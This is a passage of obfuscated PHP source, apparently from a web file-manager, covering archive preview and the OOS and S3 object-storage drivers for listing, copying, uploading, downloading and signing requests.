= array($Eق[$cյ[40]], $Eق[$cյ[734]], $Eق[$cյ[375]]); $cׇɻ = $cյ[46]($cյ[152]($cյ[183], $F)) . $cյ[348] . $cյ[708]($Eق[$cյ[375]]); } else { $F = array($c̻Ƞ[$cյ[375]], $c̻Ƞ[$cյ[40]], $c̻Ƞ[$cյ[490]]); $cׇɻ = $cյ[46]($cյ[152]($cյ[183], $F)) . $cյ[348] . $c̻Ƞ[$cյ[565]]; } goto dڅ; dڅ: if ($BԪ == -1) { $eǟ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\x69\x65\167\57{$A٣Ш}\57{$cׇɻ}\56\154\x6f\147"; $fý = self::infoFull($eǟ); if ($fý) { $eǟ = $fý[$cյ[40]]; $Eۊ = self::getContent($eǟ); if ($Eۊ) { $aԽ = $cյ[738]($Eۊ, !0); if ($cյ[37]($aԽ) >= $dǅ) { $cյ[29]($cյ[596]($cյ[387]($cյ[739]), $cյ[37]($aԽ)), !1); } return $aԽ; } } else { $eǟ = self::mkfile($eǟ); } } $dׂ㫡 = TEMP_FILES . $A٣Ш; if (!$cյ[586]($dׂ㫡)) { $cյ[403]($dׂ㫡); } goto EН; C: $cյ[721]($dׂ㫡); if (!$Fީ[$cյ[731]]) { $cյ[29]($Fީ[$cյ[733]], !1); } $aԽ = $cյ[297]($Fީ[$cյ[733]]); goto CԴΏĩ; FȽ: if ($BԪ >= 0) { $cƊ䧹 = isset($c׶[$cյ[742]]) ? $c׶[$cյ[742]] : !1; $eӊ = isset($c׶[$cյ[375]]) ? $c׶[$cյ[375]] : $cյ[67]; KodArchive::filePreview($a, $BԪ, $cƊ䧹, $eӊ); self::archiveExt(); die; } $Fީ = KodArchive::listContent($a); self::archiveExt(); goto C; EН: $a = $dׂ㫡 . $cյ[44] . $cׇɻ; if (!@$cյ[48](self::iconvSystem($a))) { if (isset($Eق)) { $cյ[740]($Aġ, $cյ[741], $a); } else { $Bؑ = self::localFilePath($Aġ, $c̻Ƞ[$cյ[565]]); $a = $Bؑ ? $Bؑ : self::download($Aġ, $a); } } $a = self::iconvSystem($a); goto FȽ; Eߏ: $cյ =& $_SERVER[拘]; $Aġ = $c׶[$cյ[40]]; $BԪ = isset($c׶[$cյ[734]]) ? $c׶[$cյ[734]] : -1; goto Fג; Fג: $dǅ = 50000; if ($cյ[735]($Aġ)) { $Eق = $cյ[736]($Aġ); if (!isset($Eق[$cյ[40]])) { $cյ[29]($cյ[737], !1); } } $Cո = isset($Eق) ? $Eق[$cյ[40]] : $Aġ; goto DԨ; b󚍮: } private function zipFileList($e܍, $A = false) { $a =& $_SERVER[拘]; $F = array(); foreach ($e܍ as $B) { $c҄ = $B[$a[40]]; if ($A) { $c҄ = self::copy($B[$a[40]], $A, $a[745]); } if ($c҄ && self::local()->{$_SERVER[拘][389]}($c҄)) { $F[$B[$a[40]]] = $c҄; } } if (!empty($F)) { return $a[442]($F); } $a[29]($a[387]($a[746]), !1); } public static function tmpFileName($cڒ) { $aǮ =& $_SERVER[拘]; $Cڎ = array($cڒ[$aǮ[375]], $cڒ[$aǮ[40]], $cڒ[$aǮ[490]], $cڒ[$aǮ[747]]); return $aǮ[46]($aǮ[152]($aǮ[183], $Cڎ)); } private function localFilePath($e, $Bҗ) { goto f昕; f昕: $aՂِ =& $_SERVER[拘]; $eش厎 = KodIO::parse($e); if ($eش厎[$aՂِ[400]] == KodIO::KOD_SOURCE) { $A存 = $aՂِ[64]($aՂِ[474])->{$_SERVER[拘][510]}(KodIO::sourceID($e)); if (!$A存[$aՂِ[40]]) { $aՂِ[29]($aՂِ[748], !1); } $e = $A存[$aՂِ[40]]; } goto e; bԅ: if ($DԤ != $aՂِ[382] || $Bҗ == $aՂِ[750] && $D۽ǣ) { return !1; } if (!$F֐->{$_SERVER[拘][389]}($F֐->path)) { $aՂِ[29]($aՂِ[387]($aՂِ[390]), !1); } self::archiveExt($Bҗ); goto Bܵ; Bܵ: return $F֐->path; goto F; e: $F֐ = self::init($e); $DԤ = $F֐->{$_SERVER[拘][380]}(); $D۽ǣ = $aՂِ[84]($aՂِ[7](PHP_OS, 0, 3)) == $aՂِ[749]; goto bԅ; F: } private function archiveExt($eۨ = '') { $GLOBALS[$_SERVER[拘][751]] = $eۨ; } } class PathDriverOOS extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $useSSL = false; private $region = ''; private $endpoint = ''; private $bucket = ''; private $oosClient = null; public function __construct($Cɼ֍) { $aȝШ =& $_SERVER[拘]; @$aȝШ[647](0); require_once SDK_DIR . $aȝШ[752]; parent::__construct(); $this->{$_SERVER[拘][526]}($Cɼ֍); } public function _init($C) { $Fӻ =& $_SERVER[拘]; foreach ($C as $dΤډ => $Eʌ) { if (isset($this->{$dΤډ})) { $this->{$dΤډ} = $Eʌ; } } $this->endpoint = $C[$Fӻ[753]]; $this->oosClient = new OOS($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->oosClient->{$_SERVER[拘][755]}($Fӻ[756]); } public function mkfile($f, $b = '', $bٟٔ = REPEAT_RENAME) { $b榪 = $this->{$_SERVER[拘][508]}($f, $b); if ($b榪 !== !1) { return $this->{$_SERVER[拘][378]}($f); } return !1; } public function mkdir($bЋҦ, $A̕ = REPEAT_SKIP) { if (empty($bЋҦ)) { return !1; } if ($this->{$_SERVER[拘][385]}($bЋҦ)) { return $this->{$_SERVER[拘][378]}($bЋҦ); } $Fߘ = $this->{$_SERVER[拘][508]}($bЋҦ, $_SERVER[拘][67], !0); if ($Fߘ !== !1) { return $this->{$_SERVER[拘][378]}($bЋҦ); } return !1; } public function copyFile($C, $e, $a֤ = array()) { $dࣼ =& $_SERVER[拘]; $f = $this->oosClient->{$_SERVER[拘][757]}($this->bucket, $C); if (!$f) { return !1; } if ($f[$dࣼ[490]] <= 104857600) { return $this->oosClient->{$_SERVER[拘][758]}($this->bucket, $C, $this->bucket, $e, $dࣼ[759], $a֤); } $eߵ = isset($f[$dࣼ[760]]) ? array($dࣼ[761] => $f[$dࣼ[760]]) : array(); return $this->oosClient->{$_SERVER[拘][762]}($this->bucket, $C, $this->bucket, $e, $eߵ); } public function moveFile($cū, $Eѧ) { if ($this->{$_SERVER[拘][374]}($cū, $Eѧ)) { $this->{$_SERVER[拘][628]}($cū); return !0; } return !1; } public function delFile($bΒ) { return $this->oosClient->{$_SERVER[拘][763]}($this->bucket, $bΒ); } public function delFolder($c) { $aƘ =& $_SERVER[拘]; $d = $this->{$_SERVER[拘][764]}($c); $fȻ = $cܼ = 0; foreach ($aƘ[765]($aƘ[766]($d), 1000) as $c) { $fȻ++; $cܼ += (int) $this->oosClient->{$_SERVER[拘][767]}($this->bucket, $c); } return $fȻ === $cܼ ? !0 : !1; } public function rename($f⚱, $CŨ) { return $this->{$_SERVER[拘][768]}($f⚱, $CŨ); } public function size($dЋ) { $e =& $_SERVER[拘]; $f짩ž = $this->{$_SERVER[拘][371]}($dЋ); return isset($f짩ž[$e[490]]) ? $f짩ž[$e[490]] : 0; } public function info($C戱Ɗ) { if ($this->{$_SERVER[拘][385]}($C戱Ɗ)) { return $this->{$_SERVER[拘][556]}($C戱Ɗ, 1); } return $this->{$_SERVER[拘][555]}($C戱Ɗ); } public function exist($f) { if ($this->{$_SERVER[拘][379]}($f)) { return !0; } return $this->{$_SERVER[拘][385]}($f); } public function isFile($C) { $b䥽 =& $_SERVER[拘]; return $this->oosClient->{$_SERVER[拘][757]}($this->bucket, $b䥽[70]($C, $b䥽[44]), !1); } public function isFolder($c) { $EȻ = $this->{$_SERVER[拘][764]}($c, null, 1); return !empty($EȻ) ? !0 : !1; } public function listPath($D, $eƻÈ = false, $d˂۝ = false) { $Fĵ˽ =& $_SERVER[拘]; $dɹީ = $this->{$_SERVER[拘][764]}($D, null, null, $Fĵ˽[44]); $bڭ = array($Fĵ˽[399] => array(), $Fĵ˽[398] => array()); foreach ($dɹީ as $b => $A) { if ($b == $Fĵ˽[44]) { continue; } if (isset($A[$Fĵ˽[769]])) { $bڭ[$Fĵ˽[399]][] = $this->{$_SERVER[拘][556]}($A[$Fĵ˽[769]], $eƻÈ, $d˂۝); } else { if ($Fĵ˽[7]($A[$Fĵ˽[375]], -1) == $Fĵ˽[44]) { continue; } $bڭ[$Fĵ˽[398]][] = $this->{$_SERVER[拘][555]}($A[$Fĵ˽[375]], $A, $d˂۝); } } return $bڭ; } private function fileInfo($cȆ, $Bԉո = array(), $fɖ = false) { goto Eߊ; Eߊ: $DΖ =& $_SERVER[拘]; if ($fɖ) { return array($DΖ[375] => $this->{$_SERVER[拘][392]}($cȆ), $DΖ[40] => $this->{$_SERVER[拘][378]}($cȆ), $DΖ[400] => $DΖ[18], $DΖ[565] => $this->{$_SERVER[拘][566]}($cȆ), $DΖ[490] => isset($Bԉո[$DΖ[490]]) ? $Bԉո[$DΖ[490]] : 0); } $a = array($DΖ[375] => $this->{$_SERVER[拘][392]}($cȆ), $DΖ[40] => $this->{$_SERVER[拘][378]}($cȆ), $DΖ[400] => $DΖ[18], $DΖ[558] => $DΖ[168], $DΖ[559] => $DΖ[168], $DΖ[490] => 0, $DΖ[565] => $this->{$_SERVER[拘][566]}($cȆ), $DΖ[770] => $DΖ[67], $DΖ[771] => !0, $DΖ[717] => !0); goto Dªܙ; Cܵ: $a[$DΖ[490]] = $Bԉո[$DΖ[490]]; return $a; goto aȠۧ; Dªܙ: if (empty($Bԉո)) { $Bԉո = $this->oosClient->{$_SERVER[拘][757]}($this->bucket, $cȆ); if (!$Bԉո) { return $a; } $this->{$_SERVER[拘][605]}($cȆ, $a); } $a[$DΖ[559]] = $Bԉո[$DΖ[772]]; $a[$DΖ[770]] = $Bԉո[$DΖ[772]]; goto Cܵ; aȠۧ: } private function folderInfo($cǙ, $CƼ = 0, $E = false) { goto eۯ; bھܒ: if ($cǙ == $dӒؠȒ[67]) { return $aԐ; } $Aв˗ = $this->oosClient->{$_SERVER[拘][757]}($this->bucket, $dӒؠȒ[70]($cǙ, $dӒؠȒ[44]) . $dӒؠȒ[44]); if (!$Aв˗) { return $aԐ; } goto F֓; EǦ: return $aԐ; goto FÂ; eۯ: $dӒؠȒ =& $_SERVER[拘]; if ($E) { return array($dӒؠȒ[375] => $this->{$_SERVER[拘][392]}($cǙ), $dӒؠȒ[40] => $this->{$_SERVER[拘][378]}($dӒؠȒ[44] . $cǙ), $dӒؠȒ[400] => $dӒؠȒ[557]); } $aԐ = array($dӒؠȒ[375] => $this->{$_SERVER[拘][392]}($cǙ), $dӒؠȒ[40] => $this->{$_SERVER[拘][378]}($dӒؠȒ[44] . $cǙ), $dӒؠȒ[400] => $dӒؠȒ[557], $dӒؠȒ[558] => $dӒؠȒ[168], $dӒؠȒ[559] => $dӒؠȒ[168], $dӒؠȒ[562] => !1, $dӒؠȒ[564] => !1, $dӒؠȒ[771] => !0, $dӒؠȒ[717] => !0); goto bھܒ; F֓: $aԐ[$dӒؠȒ[558]] = $Aв˗[$dӒؠȒ[772]]; $aԐ[$dӒؠȒ[559]] = $Aв˗[$dӒؠȒ[772]]; if ($CƼ) { $aԐ[$dӒؠȒ[562]] = $this->{$_SERVER[拘][563]}($cǙ, !1); $aԐ[$dӒؠȒ[564]] = $this->{$_SERVER[拘][563]}($cǙ, !0); } goto EǦ; FÂ: } private function listObjs($d, $Dܿ = null, $bʵ = null, $eԻ = null) { $B =& $_SERVER[拘]; $d = $B[70]($d, $B[44]); $a = empty($d) ? $B[67] : $d . $B[44]; return $this->oosClient->{$_SERVER[拘][773]}($this->bucket, $a, $Dܿ, $bʵ, $eԻ, !0); } public function has($fÉի, $Dꔬҧ = true) { $C =& $_SERVER[拘]; $eݑ = null; $eѝ = 10; $C䋻 = $C[44]; while (!0) { $C롵 = $this->{$_SERVER[拘][764]}($fÉի, $eݑ, $eѝ, $C䋻); $eݑ = $C[67]; if (!$C롵) { return !1; } if ($Dꔬҧ) { foreach ($C롵 as $fҐ) { if (isset($fҐ[$C[375]])) { return !0; } $eݑ = $fҐ[$C[375]]; } } else { foreach ($C롵 as $fҐ) { if (isset($fҐ[$C[769]])) { return !0; } $eݑ = $fҐ[$C[769]]; } } if ($eݑ == $C[67]) { break; } } return !1; } public function listAll($EӐ) { $E =& $_SERVER[拘]; $DՆ = $this->{$_SERVER[拘][764]}($EӐ); $f = $e = array(); foreach ($DՆ as $Eԑ => $bѾ) { $f[] = $bѾ[$E[375]]; $e[$Eԑ] = $bѾ[$E[490]]; } return $this->{$_SERVER[拘][774]}($EӐ, $f, $e); } public function canRead($cڥߙ) { $Aؤ =& $_SERVER[拘]; $b۳͈ = $this->oosClient->{$_SERVER[拘][775]}($this->bucket, $cڥߙ); if (!$b۳͈) { return !1; } return $Aؤ[176]($b۳͈, array($Aؤ[776], $Aؤ[777], $Aؤ[778])) ? !0 : !1; } public function canWrite($b) { $bܖ =& $_SERVER[拘]; $fǋ = $this->oosClient->{$_SERVER[拘][775]}($this->bucket, $b); if (!$fǋ) { return !1; } return $bܖ[176]($fǋ, array($bܖ[776], $bܖ[777])) ? !0 : !1; } public function getContent($aǧޯ) { return $Aԝԥ = $this->oosClient->{$_SERVER[拘][779]}($this->bucket, $aǧޯ); } public function setContent($C, $dٝ = '', $Dҽ = false) { goto fĴ; fĴ: $Dܯ =& $_SERVER[拘]; $C = $Dҽ ? $Dܯ[70]($C, $Dܯ[44]) . $Dܯ[44] : $C; $cѬ = $this->oosClient->{$_SERVER[拘][780]}($dٝ, $this->bucket, $C); goto C; b: return $cѬ ? $Dܯ[195]($dٝ) : !1; goto cߏ; C: if (!$cѬ) { return !1; } if ($Dҽ) { return !0; } $cѬ = $this->{$_SERVER[拘][374]}($C, $C, array($Dܯ[761] => $cѬ[$Dܯ[781]])); goto b; cߏ: } public function fileSubstr($b̷, $eѻԷ, $d䅹) { $d = $eѻԷ + $d䅹 - 1; return $this->oosClient->{$_SERVER[拘][779]}($this->bucket, $b̷, array($_SERVER[拘][782] => "\142\x79\x74\145\x73\75{$eѻԷ}\x2d{$d}")); } public function upload($e, $fլ, $DħΒ = false, $A¬ = REPEAT_REPLACE) { $Bش =& $_SERVER[拘]; $b = array($Bش[761] => @$Bش[639]($fլ)); if (IO::size($fլ) <= 104857600) { $A = $this->oosClient->{$_SERVER[拘][783]}($fլ, $this->bucket, $e, $Bش[759], $b); return isset($A[$Bش[781]]) ? !0 : !1; } $eލ = array(); $cᵸ = $this->oosClient->{$_SERVER[拘][784]}($fլ, $this->bucket, $Bش[70]($e, $Bش[44]), $b, $eލ); return $cᵸ ? $this->{$_SERVER[拘][378]}($e) : !1; } public function uploadFormData($A, $C = 3600) { $eԶ퐹 =& $_SERVER[拘]; $c᠜ = $this->{$_SERVER[拘][372]}($A); $A = $this->oosClient->{$_SERVER[拘][785]}($this->bucket, $c᠜, $eԶ퐹[759], $C); return $eԶ퐹[153]((array) $A, array($eԶ퐹[129] => $eԶ퐹[786] . $this->bucket . $eԶ퐹[348] . $this->endpoint)); } public function multiUploadFormData($aޫ棬ɜ, $C敎ᕊ = 3600) { goto Bܪ; Fޏ: $eƆڦ = $this->oosClient->{$_SERVER[拘][788]}($this->bucket, $aޫ棬ɜ, $d); if (!$eƆڦ) { return !1; } $c = $C[44] . $C[69]($C[789], $C[44], $C[655]($aޫ棬ɜ)); goto Fܽ; Fܽ: return array($C[790] => $eƆڦ, $C[129] => $C[786] . $this->bucket . $C[348] . $this->endpoint . $c, $C[791] => $dیӐ, $C[257] => $aޫ棬ɜ); goto eڻ݊ܶ; Bܪ: $C =& $_SERVER[拘]; $dیӐ = $C[649]($C[787]); $d = array(); goto Fޏ; eڻ݊ܶ: } public function multiUploadAuthData($aſ, $E𱸃 = array()) { goto Dʎ; Fժ: $d = isset($E𱸃[$Cɍ葒[565]]) ? $E𱸃[$Cɍ葒[565]] : $Cɍ葒[67]; $fϰ = $E𱸃[$Cɍ葒[257]]; unset($E𱸃[$Cɍ葒[257]]); goto F֤􎲣; eÇ: if (isset($E𱸃[$Cɍ葒[798]]) && $E𱸃[$Cɍ葒[798]] == $Cɍ葒[799]) { $c[0] = $Cɍ葒[799]; } $e߮ܪ = $Cɍ葒[152]($Cɍ葒[36], $c); $f© = $Cɍ葒[800]($Cɍ葒[801]($Cɍ葒[802], $e߮ܪ, $this->secret, !0)); goto aΔ; Dʎ: $Cɍ葒 =& $_SERVER[拘]; $dϤ = isset($E𱸃[$Cɍ葒[791]]) ? $E𱸃[$Cɍ葒[791]] : $Cɍ葒[649]($Cɍ葒[787]); $E𱸃[$Cɍ葒[791]] = $dϤ; goto Fժ; F֤􎲣: if (isset($E𱸃[$Cɍ葒[792]])) { return $this->{$_SERVER[拘][793]}($fϰ, $E𱸃); } $c = array($Cɍ葒[794], $Cɍ葒[67], $Cɍ葒[795], $Cɍ葒[67], "\x78\x2d\141\155\x7a\55\144\141\x74\x65\72{$dϤ}", $Cɍ葒[44] . $this->bucket . $Cɍ葒[44] . $Cɍ葒[69]($Cɍ葒[789], $Cɍ葒[44], $Cɍ葒[655]($fϰ)) . $d); if ($Cɍ葒[165]($d, $Cɍ葒[796]) === 0) { $c[0] = $Cɍ葒[797]; } goto eÇ; aΔ: $dʹ = $Cɍ葒[803] . $this->accessKey . $Cɍ葒[91] . $f©; if ($Cɍ葒[165]($d, $Cɍ葒[796]) === 0) { return array($Cɍ葒[804] => $dʹ, $Cɍ葒[791] => $dϤ); } return $dʹ; goto Ań; Ań: } public function listUploadParts($D흟, $dۑ = array()) { goto C蒪; C蒪: $Fތ¸ =& $_SERVER[拘]; $Aɖ = $Fތ¸[69]($Fތ¸[805], $Fތ¸[67], $dۑ[$Fތ¸[565]]); $Eق = $this->oosClient->{$_SERVER[拘][806]}($this->bucket, $D흟, $Aɖ); goto cֆ; D֎: $eٷ = $this->{$_SERVER[拘][807]}($D흟, $dۑ); if (empty($eٷ)) { return !1; } return array($Fތ¸[804] => $eٷ, $Fތ¸[791] => $dۑ[$Fތ¸[791]], $Fތ¸[808] => $Eق); goto cê; cֆ: if (!$Eق) { return !1; } unset($dۑ[$Fތ¸[792]], $dۑ[$Fތ¸[798]]); $dۑ[$Fތ¸[257]] = $D흟; goto D֎; cê: } public function download($b, $a猅) { if (!@$_SERVER[拘][586]($this->{$_SERVER[拘][372]}($a猅)) && !IO::mkdir($this->{$_SERVER[拘][372]}($a猅))) { return !1; } $A˙ = $this->oosClient->{$_SERVER[拘][779]}($this->bucket, $b, array(), $a猅); return $A˙ !== !1 ? $a猅 : !1; } public function link($A, $d = array()) { return $this->oosClient->{$_SERVER[拘][809]}($this->bucket, $A, 36000, !1, !1, $d); } public function fileOut($fܸ, $c냩 = false, $e = false, $EԐ = '') { goto dМ; Bԇ: die; goto Fûї; dМ: $fւ =& $_SERVER[拘]; $e = $e ? $e : $this->{$_SERVER[拘][392]}($fܸ); $c냩 = $c냩 ? $fւ[810] : $fւ[811]; goto f; f: $d = array($fւ[812] => $c냩 . $fւ[813] . $fւ[655]($e), $fւ[814] => $fւ[653]($fւ[708]($e))); $D = $this->{$_SERVER[拘][521]}($fܸ, $d); $fւ[657]($fւ[815] . $D); goto Bԇ; Fûї: } public function fileOutImage($bނ, $F = 250) { $bĳ =& $_SERVER[拘]; $fݙ = $this->{$_SERVER[拘][521]}($bނ); $bĳ[657]($bĳ[815] . $fݙ); die; } public function hashMd5($bٻ, $dއ = '') { $Dꌅ =& $_SERVER[拘]; $F޿ = $this->oosClient->{$_SERVER[拘][757]}($this->bucket, $bٻ); if (!$F޿) { return !1; } if (!isset($F޿[$Dꌅ[760]]) && !empty($dއ)) { $bٍ = $this->{$_SERVER[拘][374]}($bٻ, $bٻ, array($Dꌅ[761] => $dއ)); $F޿[$Dꌅ[760]] = $bٍ ? $dއ : $Dꌅ[67]; } return isset($F޿[$Dꌅ[760]]) ? $F޿[$Dꌅ[760]] : $Dꌅ[67]; } public function fileInfoImage($eڑ, &$c듊à) { $FÑ =& $_SERVER[拘]; $dǚ = array($FÑ[606], $FÑ[607], $FÑ[608], $FÑ[609], $FÑ[610]); if ($FÑ[176]($c듊à[$FÑ[565]], $dǚ)) { $c = $this->{$_SERVER[拘][521]}($eڑ); $b = $FÑ[816]($c); if ($b) { $c듊à[$FÑ[612]] = array($FÑ[613] => $b[0], $FÑ[817] => $b[1]); } } } } class PathDriverS3 extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $useSSL = false; private $region = ''; private $endpoint = ''; private $bucket = ''; private $s3Client = null; public function __construct($Eۍڂ) { $BĬא =& $_SERVER[拘]; @$BĬא[647](0); require_once SDK_DIR . $BĬא[818]; parent::__construct(); $this->{$_SERVER[拘][526]}($Eۍڂ); } public function _init($eԳɲ) { foreach ($eԳɲ as $A̮ӂ => $cƑ) { if (isset($this->{$A̮ӂ})) { $this->{$A̮ӂ} = $cƑ; } } $this->endpoint = $eԳɲ[$_SERVER[拘][753]]; $this->s3Client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); } public function mkfile($b, $A = '', $Cٹ񬾿 = REPEAT_RENAME) { $Cڒ = $this->{$_SERVER[拘][508]}($b, $A); if ($Cڒ !== !1) { return $this->{$_SERVER[拘][378]}($b); } return !1; } public function mkdir($f, $cۮ = REPEAT_SKIP) { if (empty($f)) { return !1; } if ($this->{$_SERVER[拘][385]}($f)) { return $this->{$_SERVER[拘][378]}($f); } $a벧䲎 = $this->{$_SERVER[拘][508]}($f, $_SERVER[拘][67], !0); if ($a벧䲎 !== !1) { return $this->{$_SERVER[拘][378]}($f); } return !1; } public function copyFile($B, $A, $eʡ = array()) { $aȴ =& $_SERVER[拘]; $EȬ = $this->s3Client->{$_SERVER[拘][757]}($this->bucket, $B); if (!$EȬ) { return !1; } if ($EȬ[$aȴ[490]] <= 104857600) { return $this->s3Client->{$_SERVER[拘][758]}($this->bucket, $B, $this->bucket, $A, $aȴ[759], $eʡ); } $Cĩ = isset($EȬ[$aȴ[760]]) ? array($aȴ[761] => $EȬ[$aȴ[760]]) : array(); return $this->s3Client->{$_SERVER[拘][762]}($this->bucket, $B, $this->bucket, $A, $Cĩ); } public function moveFile($b, $FɌٟ) { if ($this->{$_SERVER[拘][374]}($b, $FɌٟ)) { $this->{$_SERVER[拘][628]}($b); return !0; } return !1; } public function delFile($e) { return $this->s3Client->{$_SERVER[拘][763]}($this->bucket, $e); } public function delFolder($d) { $Fʨ =& $_SERVER[拘]; $b = $this->{$_SERVER[拘][764]}($d); $A = $bѢ = 0; foreach ($Fʨ[765]($Fʨ[766]($b), 1000) as $A୦ŉ) { $A++; $bѢ += (int) $this->s3Client->{$_SERVER[拘][767]}($this->bucket, $A୦ŉ); } return $A === $bѢ ? !0 : !1; } public function rename($eˉ, $CЛ) { return $this->{$_SERVER[拘][768]}($eˉ, $CЛ); } public function size($c֟) { $a۬᥊ =& $_SERVER[拘]; $Cͅߠ = $this->{$_SERVER[拘][371]}($c֟); return isset($Cͅߠ[$a۬᥊[490]]) ? $Cͅߠ[$a۬᥊[490]] : 0; } public function info($EĮ) { if ($this->{$_SERVER[拘][385]}($EĮ)) { return $this->{$_SERVER[拘][556]}($EĮ, 1); } return $this->{$_SERVER[拘][555]}($EĮ); } public function exist($AԂ) { if ($this->{$_SERVER[拘][379]}($AԂ)) { return !0; } return $this->{$_SERVER[拘][385]}($AԂ); } public function isFile($Aӫ) { $Dە =& $_SERVER[拘]; return $this->s3Client->{$_SERVER[拘][757]}($this->bucket, $Dە[70]($Aӫ, $Dە[44]), !1); } public function isFolder($C) { $A՞ = $this->{$_SERVER[拘][764]}($C, null, 1); return !empty($A՞) ? !0 : !1; } public function listPath($f, $AԢ = false, $d = false) { $a =& $_SERVER[拘]; $e֓ = $this->{$_SERVER[拘][764]}($f, null, null, $a[44]); $D = array($a[399] => array(), $a[398] => array()); foreach ($e֓ as $bհ׍ => $e༽) { if ($bհ׍ == $a[44]) { continue; } if (isset($e༽[$a[769]])) { $D[$a[399]][] = $this->{$_SERVER[拘][556]}($e༽[$a[769]], $AԢ, $d); } else { if ($a[7]($e༽[$a[375]], -1) == $a[44]) { continue; } $D[$a[398]][] = $this->{$_SERVER[拘][555]}($e༽[$a[375]], $e༽, $d); } } return $D; } private function fileInfo($Eǫ, $Aڏ = array(), $Cʋ = false) { goto A􂍺; A􂍺: $Dı =& $_SERVER[拘]; if ($Cʋ) { return array($Dı[375] => $this->{$_SERVER[拘][392]}($Eǫ), $Dı[40] => $this->{$_SERVER[拘][378]}($Eǫ), $Dı[400] => $Dı[18], $Dı[490] => isset($Aڏ[$Dı[490]]) ? $Aڏ[$Dı[490]] : 0, $Dı[565] => $this->{$_SERVER[拘][566]}($Eǫ)); } $A祖 = array($Dı[375] => $this->{$_SERVER[拘][392]}($Eǫ), $Dı[40] => $this->{$_SERVER[拘][378]}($Eǫ), $Dı[400] => $Dı[18], $Dı[558] => $Dı[168], $Dı[559] => $Dı[168], $Dı[490] => 0, $Dı[565] => $this->{$_SERVER[拘][566]}($Eǫ), $Dı[771] => !0, $Dı[717] => !0); goto E; E: if (empty($Aڏ)) { $Aڏ = $this->s3Client->{$_SERVER[拘][757]}($this->bucket, $Eǫ); if (!$Aڏ) { return $A祖; } $this->{$_SERVER[拘][605]}($Eǫ, $A祖); } $A祖[$Dı[559]] = $Aڏ[$Dı[772]]; $A祖[$Dı[490]] = $Aڏ[$Dı[490]]; goto B; B: return $A祖; goto f; f: } private function folderInfo($a䯼ݒ, $E֝ = 0, $Fڴ = false) { $Eߵ =& $_SERVER[拘]; if ($Fڴ) { return array($Eߵ[375] => $this->{$_SERVER[拘][392]}($a䯼ݒ), $Eߵ[40] => $this->{$_SERVER[拘][378]}($a䯼ݒ), $Eߵ[400] => $Eߵ[557], $Eߵ[490] => 0); } $c힞 = array($Eߵ[375] => $this->{$_SERVER[拘][392]}($a䯼ݒ), $Eߵ[40] => $this->{$_SERVER[拘][378]}($Eߵ[44] . $a䯼ݒ), $Eߵ[400] => $Eߵ[557], $Eߵ[558] => $Eߵ[168], $Eߵ[559] => $Eߵ[168], $Eߵ[562] => !1, $Eߵ[564] => !1, $Eߵ[771] => !0, $Eߵ[717] => !0); if ($E֝) { $c힞[$Eߵ[562]] = $this->{$_SERVER[拘][563]}($a䯼ݒ, !1); $c힞[$Eߵ[564]] = $this->{$_SERVER[拘][563]}($a䯼ݒ, !0); if ($a䯼ݒ == $Eߵ[67]) { return $c힞; } $B٢ = $this->s3Client->{$_SERVER[拘][757]}($this->bucket, $Eߵ[70]($a䯼ݒ, $Eߵ[44]) . $Eߵ[44]); if (!$B٢) { return $c힞; } $c힞[$Eߵ[559]] = $B٢[$Eߵ[772]]; } return $c힞; } private function listObjs($Fɇ, $aǨ = null, $A = null, $aɡ͕ = null) { $eў =& $_SERVER[拘]; $Fɇ = $eў[70]($Fɇ, $eў[44]); $EՃ刬 = empty($Fɇ) ? $eў[67] : $Fɇ . $eў[44]; return $this->s3Client->{$_SERVER[拘][773]}($this->bucket, $EՃ刬, $aǨ, $A, $aɡ͕, !0); } public function has($d, $Dԑ = true) { $a౎ =& $_SERVER[拘]; $eɌ = null; $eؑʙ = 10; $c = $a౎[44]; while (!0) { $F = $this->{$_SERVER[拘][764]}($d, $eɌ, $eؑʙ, $c); $eɌ = $a౎[67]; if (!$F) { return !1; } if ($Dԑ) { foreach ($F as $bޘ) { if (isset($bޘ[$a౎[375]])) { return !0; } $eɌ = $bޘ[$a౎[375]]; } } else { foreach ($F as $bޘ) { if (isset($bޘ[$a౎[769]])) { return !0; } $eɌ = $bޘ[$a౎[769]]; } } if ($eɌ == $a౎[67]) { break; } } return !1; } public function listAll($d˘) { $Aםԓ =& $_SERVER[拘]; $FҸ = $this->{$_SERVER[拘][764]}($d˘); $a͎ = $F = array(); foreach ($FҸ as $E => $eՎ) { $a͎[] = $eՎ[$Aםԓ[375]]; $F[$E] = $eՎ[$Aםԓ[490]]; } return $this->{$_SERVER[拘][774]}($d˘, $a͎, $F); } public function canRead($Bߒ) { $f߄ =& $_SERVER[拘]; $C = $this->s3Client->{$_SERVER[拘][775]}($this->bucket, $Bߒ); if (!$C) { return !1; } return $f߄[176]($C, array($f߄[776], $f߄[777], $f߄[778])) ? !0 : !1; } public function canWrite($DѠ) { $fȦ =& $_SERVER[拘]; $d۲ = $this->s3Client->{$_SERVER[拘][775]}($this->bucket, $DѠ); if (!$d۲) { return !1; } return $fȦ[176]($d۲, array($fȦ[776], $fȦ[777])) ? !0 : !1; } public function getContent($f󇂨) { return $this->s3Client->{$_SERVER[拘][779]}($this->bucket, $f󇂨); } public function setContent($Fߋ, $E = '', $eĥ = false) { goto c笏; fڪ: if (!$cﰸ) { return !1; } if ($eĥ) { return !0; } $cﰸ = $this->{$_SERVER[拘][374]}($Fߋ, $Fߋ, array($a߅[761] => $cﰸ[$a߅[781]])); goto DφҎ; c笏: $a߅ =& $_SERVER[拘]; $Fߋ = $eĥ ? $a߅[70]($Fߋ, $a߅[44]) . $a߅[44] : $Fߋ; $cﰸ = $this->s3Client->{$_SERVER[拘][820]}($E, $this->bucket, $Fߋ); goto fڪ; DφҎ: return $cﰸ ? $a߅[195]($E) : !1; goto b֐; b֐: } public function fileSubstr($c, $C, $bݕȇ) { $A񷃾 = $C + $bݕȇ - 1; return $this->s3Client->{$_SERVER[拘][779]}($this->bucket, $c, array($_SERVER[拘][782] => "\142\x79\x74\145\163\75{$C}\x2d{$A񷃾}")); } public function upload($e, $E򈶲, $dѻ = false, $d֓˔ = REPEAT_REPLACE) { $Cӭ =& $_SERVER[拘]; $fѣ = array($Cӭ[761] => @$Cӭ[639]($E򈶲)); if (IO::size($E򈶲) <= 104857600) { $fƑ = $this->s3Client->{$_SERVER[拘][783]}($E򈶲, $this->bucket, $e, $Cӭ[759], 